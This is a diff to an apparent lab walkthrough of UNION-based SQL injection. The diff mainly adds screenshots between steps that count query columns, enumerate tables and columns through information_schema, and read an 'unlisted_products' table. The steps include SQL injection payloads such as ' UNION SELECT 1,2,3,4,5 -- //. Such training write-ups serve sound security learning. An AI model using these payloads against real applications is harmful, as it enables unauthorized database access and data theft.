@@ -74,6 +74,13 @@ The resulting database error indicated that the application was processing the s
 
 ---
 
+<img width="1275" height="650" alt="Screenshot 2026-09-17 at 2 29 58 PM" src="https://github.com/user-attachments/assets/7f70b6cc-7426-43cf-a7fc-f4d80f4c4b1a" />
+
+<img width="1279" height="655" alt="Screenshot 2026-09-17 at 2 22 32 PM" src="https://github.com/user-attachments/assets/44d8ce15-086a-42d1-9a23-ea583cb4ac9b" />
+
+
+
+
 # 4. Determine the Number of Columns
 
 The next step was to determine how many columns were returned by the original SQL query.
@@ -83,6 +90,14 @@ The following payload was sent:
 ```sql
 ' UNION SELECT 1,2,3,4,5 -- //
 ```
+
+<img width="1269" height="653" alt="Screenshot 2026-09-17 at 2 31 17 PM" src="https://github.com/user-attachments/assets/e39ee934-b130-4774-91fc-2ef9b55a7366" />
+
+
+
+<img width="1265" height="644" alt="Screenshot 2026-09-17 at 2 31 34 PM" src="https://github.com/user-attachments/assets/d1a837c4-e40a-44fa-8ddd-4df924d53128" />
+
+
 
 
 ### Why?
@@ -113,6 +128,10 @@ The important fields are:
 
 This allowed the available database tables to be enumerated.
 
+
+<img width="1248" height="655" alt="Screenshot 2026-09-17 at 2 32 38 PM" src="https://github.com/user-attachments/assets/761ee7db-e38f-45f7-9bbf-3bcce1494ebf" />
+
+
 ---
 
 # 6. Enumerate Tables and Columns in the Current Database
@@ -126,6 +145,21 @@ WHERE table_schema=database() -- //
 ```
 
 This query provides information about tables and their associated columns within the current database.
+
+
+<img width="1271" height="654" alt="Screenshot 2026-09-17 at 2 33 56 PM" src="https://github.com/user-attachments/assets/b7632bd1-3e9e-4f4b-9507-ebeade036901" />
+
+or 
+
+
+```sql
+' UNION SELECT 1,2,table_name,column_name,1
+FROM information_schema.columns
+WHERE table_schema=database() -- //
+```
+
+
+<img width="1263" height="654" alt="Screenshot 2026-09-17 at 2 37 27 PM" src="https://github.com/user-attachments/assets/d95dd5da-f23c-4f7b-86ac-e118ad6cebf8" />
 
 ---
 
@@ -154,6 +188,7 @@ WHERE table_schema=database()
 
 This allowed the structure of `unlisted_products` to be identified.
 
+<img width="1271" height="652" alt="Screenshot 2026-09-17 at 2 34 59 PM" src="https://github.com/user-attachments/assets/a1f1ec7e-4ba9-4789-ac39-acf14adc25b8" />
 
 ---
 
@@ -167,6 +202,10 @@ FROM unlisted_products -- //
 ```
 
 The returned records were then examined for information related to the lab objective.
+
+
+<img width="1274" height="658" alt="Screenshot 2026-09-17 at 2 38 27 PM" src="https://github.com/user-attachments/assets/2c6b4bca-e7bd-46d4-8e76-63363b74d219" />
+
 
 ---
 
